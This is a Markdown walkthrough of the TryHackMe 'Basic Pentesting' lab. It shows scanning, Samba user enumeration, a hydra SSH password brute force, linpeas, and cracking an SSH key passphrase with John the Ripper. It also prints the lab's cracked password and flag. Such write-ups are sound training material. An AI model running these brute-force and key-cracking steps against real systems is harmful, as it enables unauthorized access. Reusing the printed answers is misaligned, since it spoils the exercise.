## 📌 Overview

**Room Name:** Basic Pentesting  
**Platform:** TryHackMe  
**Author:** Josiah Pierce (VulnHub)  
**Difficulty:** Easy  
**Focus Areas:**  
- Enumeration  
- Brute-force attacks  
- Linux privilege escalation  
- SSH key exploitation  

This room demonstrates a realistic beginner-level penetration testing workflow using common offensive security tools.

---

## ⚙️ Environment Setup

> ⚠️ Make sure you are connected to the **TryHackMe VPN** before starting.

---

## 🔍 1. Enumeration

### 🔎 Nmap Scan

```bash
nmap -sC -sV <target_ip>
```

**Open Ports Found:**
```
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
```

➡️ Indicates Samba service is running.

---

### 🌐 Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

📂 Discovered:
```
/development
```

Inside:
- `dev.txt`
- `j.txt`

📝 **Observation:**  
Files suggest two developers (`jan`, `kay`) and indicate weak credentials for one of them.

---

## 🧭 2. Enumeration via Samba

```bash
enum4linux <target_ip>
```

### 👤 Users Found:
```
jan
kay
```

---

## 🔓 3. Initial Access (Brute Force)

Targeting SSH login for user `jan`.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt <target_ip> ssh
```

✅ **Credentials Found**
```
jan : armando
```

---

## 🔄 4. Lateral Movement

After SSH login:

```bash
ssh jan@<target_ip>
```

While exploring:
```
/home/kay/pass.bak
```

Access denied → Privilege escalation needed.

---

## 🚀 5. Privilege Escalation

### 🔍 Using linpeas

```bash
./linpeas.sh
```

🔑 Found:
```
/home/kay/.ssh/id_rsa
```

Encrypted SSH private key detected.

---

### 🔐 Cracking SSH Key

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```

✅ Passphrase cracked successfully.

---

### 🔓 Login as Kay

```bash
ssh -i id_rsa kay@<target_ip>
```

---

## 🏁 6. Flag

```bash
cat pass.bak
```

🎯 **Flag:**
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---

## 🧠 Key Takeaways

### ✅ Lessons Learned

- 🔍 Enumeration is critical
- 🔑 Weak passwords remain common
- 🔄 Lateral movement is often possible
- 🔐 SSH private keys must be protected
- 🧪 linpeas is extremely powerful for privilege escalation
